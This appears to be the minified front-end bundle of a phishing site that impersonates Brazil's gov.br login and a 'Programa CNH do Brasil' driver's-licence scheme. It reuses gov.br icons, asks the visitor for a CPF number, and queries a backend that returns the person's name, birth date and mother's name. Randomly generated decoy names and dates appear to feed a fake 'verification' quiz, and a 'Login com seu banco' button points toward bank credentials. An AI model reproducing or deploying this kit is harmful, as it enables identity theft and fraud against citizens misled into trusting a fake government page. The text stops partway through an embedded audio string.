        F && (!F.disabled && me(o, N, xx(E, F)), V = nl(F.ref) && tt(E) ? "" : E, gx(F.ref) ? [...F.ref.options].forEach(Q => Q.selected = V.includes(Q.value)) : F.refs ? Ni(F.ref) ? F.refs.length > 1 ? F.refs.forEach(Q => (!Q.defaultChecked || !Q.disabled) && (Q.checked = Array.isArray(V) ? !!V.find(Z => Z === Q.value) : V === Q.value)) : F.refs[0] && (F.refs[0].checked = !!V) : F.refs.forEach(Q => Q.checked = Q.value === V) : Mf(F.ref) ? F.ref.value = "" : (F.ref.value = V, F.ref.type || f.values.next({
          name: N,
          values: {
            ...o
          }
        })))
      } (T.shouldDirty || T.shouldTouch) && j(N, V, T.shouldTouch, T.shouldDirty, !0), T.shouldValidate && L(N)
    }, re = (N, E, T) => {
      for (const z in E) {
        const V = E[z],
          F = `${N}.${z}`,
          Q = K(r, F);
        (a.array.has(N) || Ee(V) || Q && !Q._f) && !kr(V) ? re(F, V, T) : te(F, V, T)
      }
    }, X = (N, E, T = {}) => {
      const z = K(r, N),
        V = a.array.has(N),
        F = Et(E);
      me(o, N, F), V ? (f.array.next({
        name: N,
        values: {
          ...o
        }
      }), (d.isDirty || d.dirtyFields) && T.shouldDirty && f.state.next({
        name: N,
        dirtyFields: vo(s, o),
        isDirty: I(N, F)
      })) : z && !z._f && !tt(F) ? re(N, F, T) : te(N, F, T), rp(N, a) && f.state.next({
        ...n
      }), f.values.next({
        name: i.mount ? N : void 0,
        values: {
          ...o
        }
      })
    }, D = async N => {
      i.mount = !0;
      const E = N.target;
      let T = E.name,
        z = !0;
      const V = K(r, T),
        F = () => E.type ? Fc(V._f) : UN(N),
        Q = Z => {
          z = Number.isNaN(Z) || kr(Z) && isNaN(Z.getTime()) || Kn(Z, K(o, T, Z))
        };
      if (V) {
        let Z, Te;
        const ke = F(),
          fn = N.type === tp.BLUR || N.type === tp.FOCUS_OUT,
          Di = !r3(V._f) && !t.resolver && !K(n.errors, T) && !V._f.deps || s3(fn, K(n.touchedFields, T), n.isSubmitted, y, h),
          oo = rp(T, a, fn);
        me(o, T, ke), fn ? (V._f.onBlur && V._f.onBlur(N), c && c(0)) : V._f.onChange && V._f.onChange(N);
        const io = j(T, ke, fn, !1),
          Xl = !at(io) || oo;
        if (!fn && f.values.next({
          name: T,
          type: N.type,
          values: {
            ...o
          }
        }), Di) return d.isValid && (e.mode === "onBlur" ? fn && S() : S()), Xl && f.state.next({
          name: T,
          ...oo ? {} : io
        });
        if (!fn && oo && f.state.next({
          ...n
        }), t.resolver) {
          const {
            errors: Mi
          } = await P([T]);
          if (Q(ke), z) {
            const Jl = up(n.errors, r, T),
              _i = up(Mi, r, Jl.name || T);
            Z = _i.error, T = _i.name, Te = at(Mi)
          }
        } else g([T], !0), Z = (await lp(V, o, w, t.shouldUseNativeValidation))[T], g([T]), Q(ke), z && (Z ? Te = !1 : d.isValid && (Te = await _(r, !0)));
        z && (V._f.deps && L(V._f.deps), A(T, Te, Z, io))
      }
    }, R = (N, E) => {
      if (K(n.errors, E) && N.focus) return N.focus(), 1
    }, L = async (N, E = {}) => {
      let T, z;
      const V = ja(N);
      if (t.resolver) {
        const F = await M(Ae(N) ? N : V);
        T = at(F), z = N ? !V.some(Q => K(F, Q)) : T
      } else N ? (z = (await Promise.all(V.map(async F => {
        const Q = K(r, F);
        return await _(Q && Q._f ? {
          [F]: Q
        } : Q)
      }))).every(Boolean), !(!z && !n.isValid) && S()) : z = T = await _(r);
      return f.state.next({
        ...!rn(N) || d.isValid && T !== n.isValid ? {} : {
          name: N
        },
        ...t.resolver || !N ? {
          isValid: T
        } : {},
        errors: n.errors
      }), E.shouldFocus && !z && Fo(r, R, N ? V : a.mount), z
    }, J = N => {
      const E = {
        ...i.mount ? o : s
      };
      return Ae(N) ? E : rn(N) ? K(E, N) : N.map(T => K(E, T))
    }, oe = (N, E) => ({
      invalid: !!K((E || n).errors, N),
      isDirty: !!K((E || n).dirtyFields, N),
      error: K((E || n).errors, N),
      isValidating: !!K(n.validatingFields, N),
      isTouched: !!K((E || n).touchedFields, N)
    }), ze = N => {
      N && ja(N).forEach(E => De(n.errors, E)), f.state.next({
        errors: N ? n.errors : {}
      })
    }, Ue = (N, E, T) => {
      const z = (K(r, N, {
        _f: {}
      })._f || {}).ref,
        V = K(n.errors, N) || {},
        {
          ref: F,
          message: Q,
          type: Z,
          ...Te
        } = V;
      me(n.errors, N, {
        ...Te,
        ...E,
        ref: z
      }), f.state.next({
        name: N,
        errors: n.errors,
        isValid: !1
      }), T && T.shouldFocus && z && z.focus && z.focus()
    }, wr = (N, E) => wn(N) ? f.values.subscribe({
      next: T => N($(void 0, E), T)
    }) : $(N, E, !0), Je = (N, E = {}) => {
      for (const T of N ? ja(N) : a.mount) a.mount.delete(T), a.array.delete(T), E.keepValue || (De(r, T), De(o, T)), !E.keepError && De(n.errors, T), !E.keepDirty && De(n.dirtyFields, T), !E.keepTouched && De(n.touchedFields, T), !E.keepIsValidating && De(n.validatingFields, T), !t.shouldUnregister && !E.keepDefaultValue && De(s, T);
      f.values.next({
        values: {
          ...o
        }
      }), f.state.next({
        ...n,
        ...E.keepDirty ? {
          isDirty: I()
        } : {}
      }), !E.keepIsValid && S()
    }, dn = ({
      disabled: N,
      name: E,
      field: T,
      fields: z,
      value: V
    }) => {
      if (Jt(N) && i.mount || N) {
        const F = N ? void 0 : Ae(V) ? Fc(T ? T._f : K(z, E)._f) : V;
        me(o, E, F), j(E, F, !1, !1, !0)
      }
    }, to = (N, E = {}) => {
      let T = K(r, N);
      const z = Jt(E.disabled) || Jt(e.disabled);
      return me(r, N, {
        ...T || {},
        _f: {
          ...T && T._f ? T._f : {
            ref: {
              name: N
            }
          },
          name: N,
          mount: !0,
          ...E
        }
      }), a.mount.add(N), T ? dn({
        field: T,
        disabled: Jt(E.disabled) ? E.disabled : e.disabled,
        name: N,
        value: E.value
      }) : C(N, !0, E.value), {
        ...z ? {
          disabled: E.disabled || e.disabled
        } : {},
        ...t.progressive ? {
          required: !!E.required,
          min: xo(E.min),
          max: xo(E.max),
          minLength: xo(E.minLength),
          maxLength: xo(E.maxLength),
          pattern: xo(E.pattern)
        } : {},
        name: N,
        onChange: D,
        onBlur: D,
        ref: V => {
          if (V) {
            to(N, E), T = K(r, N);
            const F = Ae(V.value) && V.querySelectorAll && V.querySelectorAll("input,select,textarea")[0] || V,
              Q = e3(F),
              Z = T._f.refs || [];
            if (Q ? Z.find(Te => Te === F) : F === T._f.ref) return;
            me(r, N, {
              _f: {
                ...T._f,
                ...Q ? {
                  refs: [...Z.filter(Oc), F, ...Array.isArray(K(s, N)) ? [{}] : []],
                  ref: {
                    type: F.type,
                    name: N
                  }
                } : {
                  ref: F
                }
              }
            }), C(N, !1, void 0, F)
          } else T = K(r, N, {}), T._f && (T._f.mount = !1), (t.shouldUnregister || E.shouldUnregister) && !(HN(a.array, N) && i.action) && a.unMount.add(N)
        }
      }
    }, no = () => t.shouldFocusError && Fo(r, R, a.mount), ro = N => {
      Jt(N) && (f.state.next({
        disabled: N
      }), Fo(r, (E, T) => {
        const z = K(r, T);
        z && (E.disabled = z._f.disabled || N, Array.isArray(z._f.refs) && z._f.refs.forEach(V => {
          V.disabled = z._f.disabled || N
        }))
      }, 0, !1))
    }, so = (N, E) => async T => {
      let z;
      T && (T.preventDefault && T.preventDefault(), T.persist && T.persist());
      let V = Et(o);
      if (f.state.next({
        isSubmitting: !0
      }), t.resolver) {
        const {
          errors: F,
          values: Q
        } = await P();
        n.errors = F, V = Q
      } else await _(r);
      if (De(n.errors, "root"), at(n.errors)) {
        f.state.next({
          errors: {}
        });
        try {
          await N(V, T)
        } catch (F) {
          z = F
        }
      } else E && await E({
        ...n.errors
      }, T), no(), setTimeout(no);
      if (f.state.next({
        isSubmitted: !0,
        isSubmitting: !1,
        isSubmitSuccessful: at(n.errors) && !z,
        submitCount: n.submitCount + 1,
        errors: n.errors
      }), z) throw z
    }, ki = (N, E = {}) => {
      K(r, N) && (Ae(E.defaultValue) ? X(N, Et(K(s, N))) : (X(N, E.defaultValue), me(s, N, Et(E.defaultValue))), E.keepTouched || De(n.touchedFields, N), E.keepDirty || (De(n.dirtyFields, N), n.isDirty = E.defaultValue ? I(N, Et(K(s, N))) : I()), E.keepError || (De(n.errors, N), d.isValid && S()), f.state.next({
        ...n
      }))
    }, br = (N, E = {}) => {
      const T = N ? Et(N) : s,
        z = Et(T),
        V = at(N),
        F = V ? s : z;
      if (E.keepDefaultValues || (s = T), !E.keepValues) {
        if (E.keepDirtyValues) {
          const Q = new Set([...a.mount, ...Object.keys(vo(s, o))]);
          for (const Z of Array.from(Q)) K(n.dirtyFields, Z) ? me(F, Z, K(o, Z)) : X(Z, K(F, Z))
        } else {
          if (Rf && Ae(N))
            for (const Q of a.mount) {
              const Z = K(r, Q);
              if (Z && Z._f) {
                const Te = Array.isArray(Z._f.refs) ? Z._f.refs[0] : Z._f.ref;
                if (nl(Te)) {
                  const ke = Te.closest("form");
                  if (ke) {
                    ke.reset();
                    break
                  }
                }
              }
            }
          r = {}
        }
        o = e.shouldUnregister ? E.keepDefaultValues ? Et(s) : {} : Et(F), f.array.next({
          values: {
            ...F
          }
        }), f.values.next({
          values: {
            ...F
          }
        })
      }
      a = {
        mount: E.keepDirtyValues ? a.mount : new Set,
        unMount: new Set,
        array: new Set,
        watch: new Set,
        watchAll: !1,
        focus: ""
      }, i.mount = !d.isValid || !!E.keepIsValid || !!E.keepDirtyValues, i.watch = !!e.shouldUnregister, f.state.next({
        submitCount: E.keepSubmitCount ? n.submitCount : 0,
        isDirty: V ? !1 : E.keepDirty ? n.isDirty : !!(E.keepDefaultValues && !Kn(N, s)),
        isSubmitted: E.keepIsSubmitted ? n.isSubmitted : !1,
        dirtyFields: V ? {} : E.keepDirtyValues ? E.keepDefaultValues && o ? vo(s, o) : n.dirtyFields : E.keepDefaultValues && N ? vo(s, N) : E.keepDirty ? n.dirtyFields : {},
        touchedFields: E.keepTouched ? n.touchedFields : {},
        errors: E.keepErrors ? n.errors : {},
        isSubmitSuccessful: E.keepIsSubmitSuccessful ? n.isSubmitSuccessful : !1,
        isSubmitting: !1
      })
    }, Ri = (N, E) => br(wn(N) ? N(o) : N, E);
  return {
    control: {
      register: to,
      unregister: Je,
      getFieldState: oe,
      handleSubmit: so,
      setError: Ue,
      _executeSchema: P,
      _getWatch: $,
      _getDirty: I,
      _updateValid: S,
      _removeUnmounted: G,
      _updateFieldArray: p,
      _updateDisabledField: dn,
      _getFieldArray: U,
      _reset: br,
      _resetDefaultValues: () => wn(t.defaultValues) && t.defaultValues().then(N => {
        Ri(N, t.resetOptions), f.state.next({
          isLoading: !1
        })
      }),
      _updateFormState: N => {
        n = {
          ...n,
          ...N
        }
      },
      _disableForm: ro,
      _subjects: f,
      _proxyFormState: d,
      _setErrors: b,
      get _fields() {
        return r
      },
      get _formValues() {
        return o
      },
      get _state() {
        return i
      },
      set _state(N) {
        i = N
      },
      get _defaultValues() {
        return s
      },
      get _names() {
        return a
      },
      set _names(N) {
        a = N
      },
      get _formState() {
        return n
      },
      set _formState(N) {
        n = N
      },
      get _options() {
        return t
      },
      set _options(N) {
        t = {
          ...t,
          ...N
        }
      }
    },
    trigger: L,
    register: to,
    handleSubmit: so,
    watch: wr,
    setValue: X,
    getValues: J,
    reset: Ri,
    resetField: ki,
    clearErrors: ze,
    unregister: Je,
    setError: Ue,
    setFocus: (N, E = {}) => {
      const T = K(r, N),
        z = T && T._f;
      if (z) {
        const V = z.refs ? z.refs[0] : z.ref;
        V.focus && (V.focus(), E.shouldSelect && V.select())
      }
    },
    getFieldState: oe
  }
}

function l3(e = {}) {
  const t = ce.useRef(),
    n = ce.useRef(),
    [r, s] = ce.useState({
      isDirty: !1,
      isValidating: !1,
      isLoading: wn(e.defaultValues),
      isSubmitted: !1,
      isSubmitting: !1,
      isSubmitSuccessful: !1,
      isValid: !1,
      submitCount: 0,
      dirtyFields: {},
      touchedFields: {},
      validatingFields: {},
      errors: e.errors || {},
      disabled: e.disabled || !1,
      defaultValues: wn(e.defaultValues) ? void 0 : e.defaultValues
    });
  t.current || (t.current = {
    ...a3(e),
    formState: r
  });
  const o = t.current.control;
  return o._options = e, GN({
    subject: o._subjects.state,
    next: i => {
      QN(i, o._proxyFormState, o._updateFormState) && s({
        ...o._formState
      })
    }
  }), ce.useEffect(() => o._disableForm(e.disabled), [o, e.disabled]), ce.useEffect(() => {
    if (o._proxyFormState.isDirty) {
      const i = o._getDirty();
      i !== r.isDirty && o._subjects.state.next({
        isDirty: i
      })
    }
  }, [o, r.isDirty]), ce.useEffect(() => {
    e.values && !Kn(e.values, n.current) ? (o._reset(e.values, o._options.resetOptions), n.current = e.values, s(i => ({
      ...i
    }))) : o._resetDefaultValues()
  }, [e.values, o]), ce.useEffect(() => {
    e.errors && o._setErrors(e.errors)
  }, [e.errors, o]), ce.useEffect(() => {
    o._state.mount || (o._updateValid(), o._state.mount = !0), o._state.watch && (o._state.watch = !1, o._subjects.state.next({
      ...o._formState
    })), o._removeUnmounted()
  }), ce.useEffect(() => {
    e.shouldUnregister && o._subjects.values.next({
      values: o._getWatch()
    })
  }, [e.shouldUnregister, o]), ce.useEffect(() => {
    t.current && (t.current.watch = t.current.watch.bind({}))
  }, [r]), t.current.formState = KN(r, o), t.current
}

function c3() {
  return l.jsx("div", {
    className: "item-login-signup-ways",
    children: l.jsxs("button", {
      type: "button",
      tabIndex: 5,
      className: "button-href-mimic2 bank-login-button",
      children: [l.jsx("img", {
        src: "https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png",
        alt: "Ícone de Internet Banking"
      }), "Login com seu banco", l.jsx("span", {
        className: "silver-account-badge",
        children: "SUA CONTA SERÁ PRATA"
      })]
    })
  })
}

function u3(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, "$1.$2.$3-$4")
}

function Vc(e) {
  return e.replace(/\D/g, "")
}

function d3() {
  const {
    register: e,
    handleSubmit: t,
    setValue: n,
    watch: r,
    formState: {
      errors: s
    }
  } = l3(), [o, i] = x.useState(!1), [, a] = In(), c = r("cpf", ""), u = f => {
    let h = f.target.value;
    h && h !== c && (h = Vc(h), n("cpf", u3(h.slice(0, 11))))
  }, d = async f => {
    i(!0);
    try {
      const h = Vc(f.cpf),
        w = await (await fetch(`/api/consulta.php?cpf=${h}`)).json();
      w.DADOS && w.DADOS.nome && w.DADOS.nome.trim() !== "" && w.DADOS.data_nascimento && w.DADOS.data_nascimento.trim() !== "" ? (localStorage.setItem("userData", JSON.stringify({
        cpf: h,
        nome: w.DADOS.nome,
        dataNascimento: w.DADOS.data_nascimento,
        nomeMae: w.DADOS.nome_mae || ""
      })), a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w.DADOS))}`)) : a(`/verificacao?data=${encodeURIComponent(JSON.stringify({ cpf: h, nome: "", nome_mae: "", data_nascimento: "", sexo: "", manualEntry: !0 }))}`)
    } catch (h) {
      console.error("Error fetching data:", h);
      const w = {
        cpf: Vc(f.cpf),
        nome: "",
        nome_mae: "",
        data_nascimento: "",
        sexo: "",
        manualEntry: !0
      };
      a(`/verificacao?data=${encodeURIComponent(JSON.stringify(w))}`)
    } finally {
      i(!1)
    }
  };
  return l.jsx("form", {
    method: "post",
    id: "loginData",
    onSubmit: t(d),
    noValidate: !0,
    children: l.jsxs("div", {
      className: "card",
      id: "login-cpf",
      children: [l.jsx("div", {
        style: {
          display: "flex",
          justifyContent: "center",
          alignItems: "center",
          width: "100%",
          marginBottom: "16px"
        },
        children: l.jsx("img", {
          src: "/cnh-brasil-logo.png",
          alt: "CNH do Brasil",
          style: {
            height: "64px",
            objectFit: "contain"
          }
        })
      }), l.jsx("h3", {
        children: "Identifique-se no gov.br com:"
      }), l.jsx("div", {
        className: "item-login-signup-ways",
        children: l.jsxs("a", {
          tabIndex: 3,
          style: {
            display: "flex",
            alignItems: "center"
          },
          children: [l.jsx("img", {
            src: "https://sso.acesso.gov.br/assets/govbr/img/icons/id-card-solid.png",
            alt: "Ícone de um cartão de identificação sólido representando CPF"
          }), "Número do CPF"]
        })
      }), l.jsxs("div", {
        className: "accordion-panel",
        id: "accordion-panel-id",
        children: [l.jsxs("p", {
          children: ["Digite seu CPF para ", l.jsx("strong", {
            children: "criar"
          }), " ou ", l.jsx("strong", {
            children: "acessar"
          }), " sua conta gov.br"]
        }), l.jsx("label", {
          htmlFor: "cpf",
          children: "CPF"
        }), l.jsx("input", {
          id: "cpf",
          ...e("cpf", {
            required: !0
          }),
          onChange: u,
          autoComplete: "new-password",
          tabIndex: 1,
          type: "tel",
          placeholder: "Digite seu CPF",
          "aria-invalid": s.cpf ? "true" : "false"
        }), l.jsx("div", {
          className: "button-panel",
          id: "login-button-panel",
          children: l.jsxs("button", {
            type: "submit",
            className: "button-continuar flex items-center justify-center gap-2",
            tabIndex: 2,
            disabled: o,
            children: [o && l.jsx(vt, {
              className: "h-4 w-4 animate-spin"
            }), o ? "Acessando..." : "Continuar"]
          })
        })]
      })]
    })
  })
}

function f3() {
  return l.jsxs(l.Fragment, {
    children: [l.jsx("header", {
      children: l.jsx("img", {
        src: "https://i.ibb.co/WGrsWGN/IMG-1297.jpg",
        alt: "Imagem de cabeçalho com design moderno e cores vibrantes",
        style: {
          width: "100%"
        }
      })
    }), l.jsxs("div", {
      className: "container",
      children: [l.jsx("aside", {
        id: "aside-signin",
        children: l.jsx("img", {
          id: "identidade-govbr",
          src: "/img/govbr-logo.png",
          alt: "Logomarca GovBR"
        })
      }), l.jsx("main", {
        id: "main-signin",
        children: l.jsx(d3, {})
      })]
    })]
  })
}

function rt() {
  const [e, t] = x.useState("");
  return x.useEffect(() => {
    var r;
    const n = localStorage.getItem("userData");
    if (n) {
      const s = JSON.parse(n);
      s.nome && t(s.nome.split(" ")[0])
    } (r = window.tailwind) != null && r.config && (window.tailwind.config = {
      theme: {
        extend: {
          colors: {
            "custom-blue": "#1451B4",
            "custom-bg": "#F8F8F8"
          }
        }
      }
    })
  }, []), l.jsxs(l.Fragment, {
    children: [l.jsxs("header", {
      style: {
        backgroundColor: "white",
        padding: "12px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none"
      },
      children: [l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("img", {
          src: "https://i.ibb.co/zPFChvR/logo645.png",
          alt: "Logo gov.br estilizada com texto em azul e amarelo",
          style: {
            marginRight: "32px",
            background: "none",
            boxShadow: "none"
          },
          width: "70",
          height: "24"
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            fontSize: "14px",
            marginLeft: "32px",
            cursor: "pointer",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          "aria-label": "Menu de links",
          children: l.jsx("i", {
            className: "fas fa-ellipsis-v",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("div", {
          style: {
            borderLeft: "1px solid #ccc",
            height: "24px",
            margin: "0 16px",
            background: "none",
            boxShadow: "none"
          }
        })]
      }), l.jsxs("div", {
        style: {
          display: "flex",
          alignItems: "center",
          background: "none",
          boxShadow: "none"
        },
        children: [l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          children: l.jsx("i", {
            className: "fas fa-cookie-bite",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsx("button", {
          style: {
            border: "none",
            color: "#1451B4",
            cursor: "pointer",
            marginLeft: "24px",
            background: "none",
            boxShadow: "none",
            padding: 0
          },
          type: "button",
          "aria-label": "Sistemas",
          children: l.jsx("i", {
            className: "fas fa-th",
            style: {
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          })
        }), l.jsxs("button", {
          style: {
            backgroundColor: "#1451B4",
            color: "white",
            border: "none",
            borderRadius: "9999px",
            padding: "6px 16px",
            display: "flex",
            alignItems: "center",
            fontSize: "14px",
            cursor: "pointer",
            marginLeft: "24px",
            boxShadow: "none"
          },
          type: "button",
          children: [l.jsx("i", {
            className: "fas fa-user",
            style: {
              color: "white",
              marginRight: "8px",
              background: "none",
              boxShadow: "none",
              fontSize: "16px"
            },
            "aria-hidden": "true"
          }), l.jsx("span", {
            children: e || "Entrar"
          })]
        })]
      })]
    }), l.jsxs("nav", {
      style: {
        backgroundColor: "white",
        padding: "16px 24px",
        display: "flex",
        justifyContent: "space-between",
        alignItems: "center",
        border: "none",
        boxShadow: "none",
        borderBottom: "1px solid #E5E5E5"
      },
      children: [l.jsxs("button", {
        style: {
          border: "none",
          color: "#1451B4",
          display: "flex",
          alignItems: "center",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        children: [l.jsx("i", {
          className: "fas fa-bars",
          style: {
            marginRight: "10px",
            fontSize: "16px",
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        }), l.jsx("span", {
          style: {
            color: "#666",
            fontSize: "1rem",
            fontWeight: 300,
            lineHeight: "20px",
            paddingTop: "2px",
            background: "none",
            boxShadow: "none"
          },
          children: "Programa CNH do Brasil"
        })]
      }), l.jsx("button", {
        style: {
          border: "none",
          color: "#1451B4",
          fontSize: "16px",
          cursor: "pointer",
          background: "none",
          boxShadow: "none",
          padding: 0
        },
        "aria-label": "Pesquisar",
        children: l.jsx("i", {
          className: "fas fa-search",
          style: {
            background: "none",
            boxShadow: "none"
          },
          "aria-hidden": "true"
        })
      })]
    })]
  })
}

function dp(e) {
  return e.toLowerCase().split(" ").map(t => t.charAt(0).toUpperCase() + t.slice(1)).join(" ")
}

function h3(e = !1) {
  const t = e ? ["Maria", "Ana", "Helena", "Alice", "Laura", "Beatriz", "Clara", "Sofia", "Julia", "Isabella"] : ["Miguel", "Arthur", "Heitor", "Helena", "Alice", "Laura", "Maria", "João", "Pedro", "Lucas"],
    n = ["Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira", "Alves", "Pereira"],
    r = ["Costa", "Carvalho", "Gomes", "Martins", "Rocha", "Ribeiro", "Pinto", "Marques"];
  return `${t[Math.floor(Math.random() * t.length)]} ${n[Math.floor(Math.random() * n.length)]} ${r[Math.floor(Math.random() * r.length)]}`
}

function fp(e) {
  if (!e) return "";
  if (/^\d{2}\/\d{2}\/\d{4}$/.test(e)) return e;
  if (/^\d{4}-\d{2}-\d{2}$/.test(e)) {
    const [n, r, s] = e.split("-");
    return `${s}/${r}/${n}`
  }
  const t = new Date(e);
  return isNaN(t.getTime()) ? e : t.toLocaleDateString("pt-BR")
}

function Bc(e, t) {
  const n = [e];
  if (t === "date")
    for (; n.length < 3;) {
      const r = new Date(1950, 0, 1),
        s = new Date(2e3, 11, 31),
        o = new Date(r.getTime() + Math.random() * (s.getTime() - r.getTime())),
        i = String(o.getDate()).padStart(2, "0"),
        a = String(o.getMonth() + 1).padStart(2, "0"),
        c = o.getFullYear(),
        u = `${i}/${a}/${c}`;
      n.includes(u) || n.push(u)
    } else
    for (; n.length < 3;) {
      const r = h3(t === "mother");
      n.includes(r) || n.push(r)
    }
  return n.sort(() => Math.random() - .5)
}
const m3 = ["@gmail.com", "@hotmail.com", "@outlook.com", "@yahoo.com.br", "@uol.com.br", "@bol.com.br", "@terra.com.br"],
  p3 = () => {
    new Audio("data:audio/wav;base64,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